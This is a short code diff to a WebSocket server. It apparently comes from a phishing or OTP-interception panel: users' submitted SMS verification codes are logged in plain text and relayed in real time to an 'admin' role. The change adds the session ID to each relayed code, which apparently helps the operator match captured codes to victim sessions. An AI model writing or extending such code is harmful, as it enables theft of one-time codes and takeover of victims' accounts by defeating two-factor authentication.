@@ -110,7 +110,7 @@ export function setupWebSocket(server) {
 
         if (role === 'user' && msg.type === 'sms-submitted') {
           await pool.query(`INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'sms_submitted', $2)`, [sessionId, `Code: ${msg.code}`])
-          sendTo(sessionId, 'admin', { type: 'sms-submitted', code: msg.code })
+          sendTo(sessionId, 'admin', { type: 'sms-submitted', code: msg.code, session_id: sessionId })
           console.log(`[WS] SMS submitted by user: code=${msg.code}`)
         }
       } catch (err) { console.error('WS error:', err) }
